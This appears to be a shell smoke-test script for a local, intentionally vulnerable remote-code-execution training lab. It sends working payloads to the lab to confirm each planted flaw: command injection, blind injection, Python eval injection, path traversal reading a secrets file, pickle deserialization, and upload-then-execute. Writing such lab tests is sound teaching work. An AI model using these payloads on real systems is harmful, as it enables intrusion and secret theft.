#!/usr/bin/env bash
# Smoke tests for the RCE lab. Prints PASS or FAIL for each expected bug.
set -uo pipefail
PORT="${PORT:-$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')}"
BASE="http://127.0.0.1:$PORT"
DIR="$(cd "$(dirname "$0")" && pwd)"
PASS=0
FAIL=0

rm -f "$DIR/evidence/blind.txt" "$DIR/uploads/owned.py"
mkdir -p "$DIR/evidence"
python3 "$DIR/lab_server.py" --port "$PORT" >/tmp/beril-rce-lab.log 2>&1 &
PID=$!
trap 'kill $PID 2>/dev/null' EXIT
sleep 1

check() {
  local name="$1" needle="$2" haystack="$3"
  if grep -q "$needle" <<<"$haystack"; then
    echo "PASS $name"; PASS=$((PASS+1))
  else
    echo "FAIL $name"; FAIL=$((FAIL+1))
  fi
}

check "index" "RCE lab" "$(curl -s "$BASE/")"
check "cmd injection" "uid=" "$(curl -s --get --data-urlencode 'host=127.0.0.1;id' "$BASE/cmd")"
check "blind injection" "Checked" "$(curl -s --get --data-urlencode "host=127.0.0.1;touch $DIR/evidence/blind.txt" "$BASE/blind")"
sleep 0.3
check "blind file" "x" "$(test -f "$DIR/evidence/blind.txt" && echo x)"
check "eval injection" "uid=" "$(curl -s --get --data-urlencode 'expr=__import__("os").popen("id").read()' "$BASE/calc")"
check "traversal read" "API_TOKEN" "$(curl -s --get --data-urlencode 'file=secret.env' "$BASE/read")"

PICKLE=$(python3 - <<'PY'
import base64, pickle, subprocess
class P:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))
print(base64.b64encode(pickle.dumps(P())).decode())
PY
)
check "pickle rce" "uid=" "$(curl -s --get --data-urlencode "data=$PICKLE" "$BASE/deser")"

printf 'print(__import__("os").popen("id").read())\n' > "$DIR/evidence/owned.py"
check "upload" "Stored" "$(curl -s --data-binary @"$DIR/evidence/owned.py" "$BASE/upload?name=owned.py")"
check "upload exec" "uid=" "$(curl -s --get --data-urlencode 'name=owned.py' "$BASE/plugin")"

echo "---"
echo "pass=$PASS fail=$FAIL"
[ "$FAIL" = "0" ]
